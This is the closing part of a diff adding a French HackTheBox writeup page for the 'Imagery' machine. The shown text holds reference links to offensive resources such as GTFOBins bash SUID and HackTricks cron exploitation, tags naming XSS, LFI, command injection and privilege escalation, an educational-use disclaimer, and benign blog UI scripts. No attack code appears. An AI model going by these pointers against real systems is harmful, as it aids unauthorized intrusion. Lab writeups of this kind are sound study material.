+<li><a href="https://owasp.org/www-community/attacks/Path_Traversal">OWASP - Path Traversal</a></li>
+<li><a href="https://github.com/marcobellaccini/pyAesCrypt">pyAesCrypt Documentation</a></li>
+<li><a href="https://imagemagick.org/script/security-policy.php">ImageMagick Security</a></li>
+<li><a href="https://gtfobins.github.io/gtfobins/bash/#suid">GTFOBins - Bash SUID</a></li>
+<li><a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation#cron-jobs">Cron Job Exploitation</a></li>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html">Password Hashing - OWASP</a></li>
+</ul>
+<hr>
+<p><strong>Auteur:</strong> kz<br>
+<strong>Date:</strong> 21 Décembre 2025<br>
+<strong>Machine:</strong> Imagery (HackTheBox)<br>
+<strong>Difficulté:</strong> Medium</p>
+<hr>
+<p><strong>Note:</strong> Ce writeup est à des fins éducatives. N&rsquo;utilisez ces techniques que dans des environnements autorisés (CTF, labs personnels, pentests autorisés).</p>
+<p><strong>Tags:</strong> <code>#HackTheBox</code> <code>#CTF</code> <code>#XSS</code> <code>#LFI</code> <code>#CommandInjection</code> <code>#ImageMagick</code> <code>#AES-Crypt</code> <code>#PrivilegeEscalation</code> <code>#Cron</code> <code>#SUID</code></p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://keyll0ger.github.io/tags/htb/">HTB</a></li>
+      <li><a href="https://keyll0ger.github.io/tags/linux/">Linux</a></li>
+      <li><a href="https://keyll0ger.github.io/tags/medium/">Medium</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://keyll0ger.github.io/posts/fluffy/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>Fluffy - HackTheBox Writeup</span>
+  </a>
+  <a class="next" href="https://keyll0ger.github.io/posts/kobold/">
+    <span class="title">Next »</span>
+    <br>
+    <span>kobold - HackTheBox Writeup</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="https://keyll0ger.github.io/">keyll0ger</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
